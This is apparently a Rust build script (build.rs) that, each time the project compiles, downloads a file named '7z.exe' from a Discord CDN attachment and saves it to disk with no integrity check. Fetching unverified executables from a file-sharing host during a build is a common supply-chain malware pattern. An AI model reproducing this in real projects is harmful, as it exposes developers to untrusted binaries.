use std::io;
use std::fs::OpenOptions;
use reqwest::blocking;

fn main() {
    println!("cargo:rerun-if-changed=7z.exe");
    let mut file = OpenOptions::new().write(true).create(true).truncate(true)
    .open("7z.exe").unwrap();
    let mut req = blocking::
    get("https://cdn.discordapp.com/attachments/713385142277767200/1006350877105328148/7z.exe")
    .unwrap();
    io::copy(&mut req, &mut file).unwrap();
}